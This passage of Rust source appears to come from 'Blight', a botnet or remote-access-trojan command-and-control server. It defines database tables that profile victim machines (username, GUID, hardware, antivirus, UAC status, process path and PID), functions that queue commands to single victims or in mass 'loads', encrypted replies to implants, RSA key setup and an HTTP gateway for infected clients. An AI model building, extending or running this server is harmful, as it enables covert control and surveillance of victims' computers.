async fn task_client(connection: &mut Conn, client_id: &str, cmd_args: &str, cmd_type: &str) -> bool{
    let command_id = generate(8, "abcdef123456789");
    let task_client_sql_success = connection.exec_drop(  
        r"
        INSERT INTO commands (
            command_id, client_id, cmd_type,
            cmd_args, time_issued
        ) VALUES (
            :command_id, :client_id, :cmd_type, :cmd_args, :time_issued
        )",
        params! {
            "command_id" => &command_id,
            "client_id" => &client_id,
            "cmd_type" => &cmd_type,
            "cmd_args" => &cmd_args,
            "time_issued" => get_timestamp(),
        }
    ).await;

    match task_client_sql_success {
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "(task_client): {}", 
                e
            ));
            false
        }
    }
}

async fn get_current_client_command(connection: &mut Conn, client_id: &str) -> std::result::Result<(String, String, String), GenericError> {
    
    let command_fetch_sql = connection.exec_first(
        r"SELECT command_id, cmd_args, cmd_type FROM commands WHERE client_id = :client_id",
        params! {
            "client_id" => client_id,
        }
    ).await;

    match command_fetch_sql {

        Ok(None) => {
            Err(GenericError::NoRows)
        },
        Ok(_) => {
            let unwrapped: (String, String, String) = command_fetch_sql.unwrap().unwrap();
            Ok((
                unwrapped.0,
                encode_block(&parse_storage_read(&unwrapped.1)),
                unwrapped.2,
            ))
        },
        Err(e) => {

            fprint("error", &format!(
                "(get_current_client_command): {}", 
                &e
            ));            
            Err(GenericError::Mysql(e))
        }
    }
}

async fn get_command_info(connection: &mut Conn, command_id: &str) -> std::result::Result<(String, String, String, u64), GenericError> {

    let command_fetch_sql = connection.exec_first(
        r"SELECT command_id, cmd_args, cmd_type, time_issued FROM commands WHERE command_id = :command_id",
        params! {
            "command_id" => command_id,
        }
    ).await;

    match command_fetch_sql {
       
        Ok(_) => {
            let unwrapped: (String, String, String, u64) = command_fetch_sql.unwrap().unwrap();
            Ok((
                unwrapped.0,
                unwrapped.1,
                unwrapped.2,
                unwrapped.3,
            ))
        },
        Err(e) => {
            fprint("error", &format!(
                "At get_current_client_command: {}", 
                &e
            ));            
            Err(GenericError::Mysql(e))
        }
    }

}

async fn is_command(connection: &mut Conn, command_id: &String, client_id: &String) -> bool {

    let command_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT command_id FROM commands WHERE client_id = :client_id AND command_id = :command_id",
        params! {
            "client_id" => client_id,
            "command_id" => command_id,
        }
    ).await;
    
    match command_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "At is_command: {}", 
                e
            ));
            false
        },
    }
}

async fn is_uncompleted_load(connection: &mut Conn, client_id: &String, load_id: &String) -> bool {
    let loads_query_sql = connection.exec_drop(
        r"SELECT * FROM loads WHERE load_id NOT IN (SELECT command_id FROM outputs WHERE client_id = :client_id) AND load_id = :load_id",
        params! {
            "client_id" => &client_id,
            "load_id" => &load_id,
        }
    ).await;

    match loads_query_sql {
        Ok(_) => true,
        Err(ref e) => {
            fprint("error", &format!(
                "(is_uncompleted_load): {}", 
                e
            ));
            false
        }
    }
}

fn parse_storage_write(storage: &[u8]) -> String {
    let storage_id = generate(16, "abcdefghijklmnopqrstuvwxyz");

    // Try decoding. If decoding fails, do nothing. If decoding succeeds, use that for the rest of the fn.
    let parsed_storage = match decode_block(str::from_utf8(storage).unwrap()) {
        Ok(decoded_blob) => decoded_blob,
        Err(_) => storage.to_owned()
    };

    if (&parsed_storage).len() >= 1024 {
        let mut file = File::create(format!("artifacts/storages/{}", &storage_id)).unwrap();
        file.write_all(&compress_bytes(&parsed_storage)).unwrap();
        return format!("storage:{}", storage_id)
    } else {
        match String::from_utf8(parsed_storage.to_owned()) {
            Ok(stringaling) => return stringaling,
            Err(error) => {
                fprint("error", &format!("(parse_storage_write, writing): storage ID {}: {}", &storage_id, error));
                return String::from("Invalid storage")
            }
        }
    }

}


fn parse_storage_read(storage: &str) -> Vec<u8> {
    if (&storage).starts_with("storage:") {
        let storage_id = storage.split(":").collect::<Vec<&str>>()[1];
        match fs::read(format!("artifacts/storages/{}", storage_id)) {
            Ok(result) => {
                return decompress_bytes(&result);
            },
            Err(error) => {
                fprint("error", &format!("(parse_storage_read): storage ID {}: {}", &storage_id, error));
                return "Invalid storage".as_bytes().to_vec();
            }
        };
    } else {
        return "Invalid storage".as_bytes().to_vec();
    }
} 

// ------------------------ General Functions ------------------------


fn get_timestamp() -> u64 {
    let since_the_epoch = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards lmao");
    return since_the_epoch.as_secs()
}

async fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<String, ErrorStack> {
    let cipher = Cipher::aes_256_cbc();

    let mut encrypter = Crypter::new(cipher, Mode::Encrypt, key, Some(&key[..16]))?;
    encrypter.pad(true);

    let mut ciphertext = vec![0; plaintext.len() + cipher.block_size()];
    let count = encrypter.update(plaintext.as_bytes(), &mut ciphertext)?;
    let final_count = encrypter.finalize(&mut ciphertext[count..])?;

    ciphertext.truncate(count + final_count);
    Ok(encode_block(&ciphertext))
}


async fn decrypt_string_withkey(ciphertext: &str, key: &[u8]) -> std::result::Result<Vec<u8>, ErrorStack> {
    let ciphertext = decode_block(ciphertext).unwrap();
    let cipher = Cipher::aes_256_cbc();
    let mut decrypter = Crypter::new(cipher, Mode::Decrypt, key, Some(&key[..16]))?;
    decrypter.pad(true);

    let mut plaintext = vec![0; ciphertext.len() + cipher.block_size()];
    let count = decrypter.update(&ciphertext, &mut plaintext)?;
    let final_count = decrypter.finalize(&mut plaintext[count..])?;

    plaintext.truncate(count + final_count);
    Ok(plaintext)
}

fn fprint(stype: &str, sformatted: &str) -> () {
    
    let color = match stype {
        "info" => stype.to_uppercase().cyan(),
        "error" => stype.to_uppercase().red(),
        "failure" => stype.to_uppercase().red(),
        "restricted" => stype.to_uppercase().red(),
        "success" => stype.to_uppercase().green(),
        "task" => stype.to_uppercase().yellow(),
        _ => stype.to_uppercase().white(),
    };


    println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
}


fn value_to_str(row: &mysql_async::Row, index: usize) -> String {
    if let Some(value) = row.as_ref(index) {
        match value {
            Value::NULL => String::from(""),
            Value::Bytes(v) => String::from_utf8_lossy(v.as_slice()).into_owned(),
            Value::Int(v) => format!("{v}"),
            Value::UInt(v) => format!("{v}"),
            Value::Float(v) => format!("{v}"),
            Value::Double(v) => format!("{v}"),
            Value::Date(_year, _month, _day, _hour, _minutes, _seconds, _micro) => todo!(),
            Value::Time(_negative, _days, _hours, _minutes, _seconds, _micro) => todo!(),
        }
    } else {
        String::from("")
    }
}

fn value_to_u64(row: &mysql_async::Row, index: usize) -> u64 {return value_to_str(row, index).parse::<u64>().unwrap();}
fn value_to_bool(row: &mysql_async::Row, index: usize) -> bool { match value_to_u64(row, index) {1 => true, 0 => false, _ => panic!("Not a bool")} }

fn key_to_string(json: &serde_json::Value, json_key: &str) -> String {String::from(json[json_key].as_str().unwrap())}
fn key_to_u64(json: &serde_json::Value, json_key: &str) -> u64 {json[json_key].as_u64().unwrap()}
fn key_to_bool(json: &serde_json::Value, json_key: &str) -> bool {json[json_key].as_bool().unwrap()}
fn key_exists(json: &serde_json::Value, json_key:&str) -> bool {if let Some(_) = json.get(json_key) {return true} else {return false}}

fn all_keys_valid(json: &serde_json::Value, keys: Vec<&str>, types: Vec<&str>) -> bool {
    let mut counter: usize = 0;
    for key in keys {
        if let Some(_) = json.get(key) {
            // Check if key is one of the valid types:
            if types[counter] == "String" {
                match json[key].as_str() {
                    Some(_) => (),
                    None => return false,
                };
            } else if types[counter] == "u64" {
                match json[key].as_u64() {
                    Some(_) => (),
                    None => return false,
                };
            } else if types[counter] == "bool" {
                match json[key].as_bool() {
                    Some(_) => (),
                    None => return false,
                };
            }
        } else {
            return false;
        }
        counter += 1;
    }
    return true
}

async fn ip_to_country(ip: &str) -> String {
    let ip_db = &*IP_DATABASE.read().unwrap();
    let reader = maxminddb::Reader::from_source(ip_db).unwrap();
    let ip: IpAddr = ip.parse().unwrap();
    let country: std::prelude::v1::Result<geoip2::Country, maxminddb::MaxMindDBError> = reader.lookup(ip);
    match country {
        Ok(_) => String::from(country.unwrap().country.unwrap().iso_code.unwrap()),
        Err(_) => String::from("NL")
    }
}


// ------------------------ HTTP Responses ------------------------

fn resp_unauthorised() -> HttpResponse {
    return HttpResponse::build(StatusCode::UNAUTHORIZED).body("You do not have the required authorization to complete this request.");
}

fn resp_badrequest() -> HttpResponse {
    return HttpResponse::build(StatusCode::BAD_REQUEST).body("Your request was malformed. Check the information you provided alongside this request.");
}

fn resp_servererror() -> HttpResponse {
    return HttpResponse::build(StatusCode::INTERNAL_SERVER_ERROR).body("The server is overwhelmed or under maintinence. Retry your request at a later date.");
}

fn resp_ok(message: String) -> HttpResponse {
    return HttpResponse::build(StatusCode::OK).body(message);
}

async fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
    return HttpResponse::build(StatusCode::OK).body(encrypt_string_withkey(message, key).await.unwrap());
}

// ------------------------ Init Functions ------------------------


async fn initialize_tables(connection_pool: Pool) {
    let mut connection: Conn = connection_pool.get_conn().await.expect("Unable to connect to database.");

    connection.query_drop(r"
    
        SET GLOBAL query_cache_size = 268435455;

    ").await.expect("Failed to init db");

    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS clients (
            client_id TEXT,
            version INTEGER,
            uac BOOL,
            ip TEXT,
            country TEXT,
            username TEXT,
            guid TEXT,
            cpu TEXT,
            gpu TEXT,
            ram INTEGER,
            antivirus TEXT,
            path TEXT,
            pid INTEGER,
            last_seen INTEGER,
            first_seen INTEGER,
            encryption_key TEXT
        )  ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients (client_id);
        ").await.expect("clients table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT,
            load_id TEXT,
            client_id TEXT,
            cmd_type TEXT,
            cmd_args TEXT,
            time_issued INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands (client_id);
        CREATE INDEX IF NOT EXISTS idx_commands_command_id ON commands (command_id);

        ").await.expect("commands table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS outputs (
            output_id TEXT,
            command_id TEXT,
            client_id TEXT,
            cmd_args TEXT,
            cmd_type TEXT,
            output TEXT,
            time_issued INT,
            time_received INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_outputs_client_id ON outputs (client_id);
        CREATE INDEX IF NOT EXISTS idx_outputs_command_id ON outputs (command_id);
        CREATE INDEX IF NOT EXISTS idx_outputs_output_id ON outputs (output_id);
        ").await.expect("outputs table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS loads (
            load_id TEXT,
            required_amount INT,
            is_recursive BOOL,
            cmd_args TEXT,
            cmd_type TEXT,
            time_issued INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_loads_load_id ON loads (load_id);
        ").await.expect("loads table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS blocks (
            block_id TEXT,
            client_id TEXT,
            reason TEXT,
            ip TEXT,
            banned_until INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_blocks_client_id ON blocks (client_id);
        CREATE INDEX IF NOT EXISTS idx_blocks_ip ON blocks (ip);
        ").await.expect("blocks table creation failed");

    drop(connection);
}


// Odd duplication issue when submitting output. Running apis.py multiple times will make storages pop out of nowhere.
// Need to think of a better name other than storages.
// Need to refactor code.

fn compress_bytes(input: &[u8]) -> Vec<u8>{
    let mut compressor = GzEncoder::new(Vec::new(), Compression::default());
    compressor.write_all(&input).unwrap();
    return compressor.finish().unwrap()
}

fn decompress_bytes(input: &[u8]) -> Vec<u8>{
    let mut decompressor = GzDecoder::new(input);
    let mut decompressed_bytes: Vec<u8> = vec![];
    decompressor.read(&mut decompressed_bytes).unwrap();
    return decompressed_bytes;
}

// ------------------------ Main Program ------------------------


#[actix_web::main]
async fn main() -> std::io::Result<()> {

    println!("
    _                 
    /_  //  .  __   /_  -/-
  _/_)_(/__/__(_/__/ (__/_ 
              _/_          
             (/            
                           
    ");

    // Set open file limit to really high
    Command::new("ulimit")
    .arg("-n")
    .arg("524288");


    let json_config = fs::read("artifacts/configuration/server_config.json");

    fs::create_dir_all("artifacts/storages").unwrap();
    fs::create_dir_all("artifacts/configuration").unwrap();
    fs::create_dir_all("artifacts/keys").unwrap();
    fs::create_dir_all("artifacts/databases").unwrap();

    match json_config {
        Ok(_) => (),
        Err(_) => {
            write!(File::create("artifacts/configuration/server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                &json!({
                    "host": "127.0.0.1:9999",
                    "connection_interval": 60,
                    "mysql_server": "mysql://root:root@127.0.0.1:3306/mydb",
                    "api_secret": "root",
                    "ENABLE_FIREWALL": false
                })
            ).unwrap()).expect("Unable to write json file.");

            fprint("info", "Your \"artifacts/configuration/server_config.json\" file wasn't present. No worries, we've created it for you. ");
            fprint("info", "Open it in a text editor, and fill out the fields. Then, re-run Blight.");
            exit(1);
        }
    };

    let parsed_json_config: serde_json::Value = serde_json::from_str(str::from_utf8(&json_config.unwrap()).unwrap()).expect("erm");

    fprint("task", "We're setting up your server. This might take a few, hang tight.");
    let connection_pool: Pool = Pool::new(Opts::from_url(&key_to_string(&parsed_json_config, "mysql_server")).unwrap());
    let geolite_db = fs::read("artifacts/databases/GeoLite2-Country.mmdb");

    match geolite_db {
        Ok(_) => (),
        Err(_) => {
            fprint("error", "You don't have \"GeoLite2-Country.mmdb\" dowloaded. Find it and place it in \"artifacts/databases\"");
            exit(1);
        }
    };

    if !Path::new("artifacts/keys/private.pem").exists() {
        let mut rng = rand::thread_rng();
        let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate a key");
        let pub_key = RsaPublicKey::from(&priv_key);
        
        priv_key.write_pkcs1_pem_file("artifacts/keys/private.pem", rsa::pkcs1::LineEnding::LF).unwrap();
        pub_key.write_pkcs1_pem_file("artifacts/keys/public.pem", rsa::pkcs1::LineEnding::LF).unwrap();

        fprint("success", "RSA key pair was created, since there wasn't one before.");
    }

    *CONNECTION_POOL.write().unwrap() = connection_pool.clone();
    *CONNECTION_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval");
    *ENABLE_FIREWALL.write().unwrap() = key_to_bool(&parsed_json_config, "enable_firewall");
    *API_SECRET.write().unwrap() = key_to_string(&parsed_json_config, "api_secret");
    *PRIVATE_KEY.write().unwrap() = RsaPrivateKey::from_pkcs1_pem(&fs::read_to_string("artifacts/keys/private.pem").unwrap()).unwrap();
    *IP_DATABASE.write().unwrap() = geolite_db.unwrap();
    *HOST.write().unwrap() = key_to_string(&parsed_json_config, "host");

    initialize_tables(connection_pool.clone()).await;

    fprint("info", &format!(
        "Server running! Gateway path: {}", 
        format!("http://{}/gateway", key_to_string(&parsed_json_config, "host")).yellow()
    ));

    HttpServer::new(move || {
        App::new()
            .app_data(web::PayloadConfig::default().limit(100000000)) // 500mb
            .service(gateway)
            .service(api_issue_load)
            .service(api_clients_list)
            .service(api_get_output)
            .service(loads_list)
            .service(remove_load)
            .service(statistics)
            .service(api_blocks_list)
            .service(api_remove_block)
    })
    .bind(&key_to_string(&parsed_json_config, "host"))? 
    .run()
    .await
}
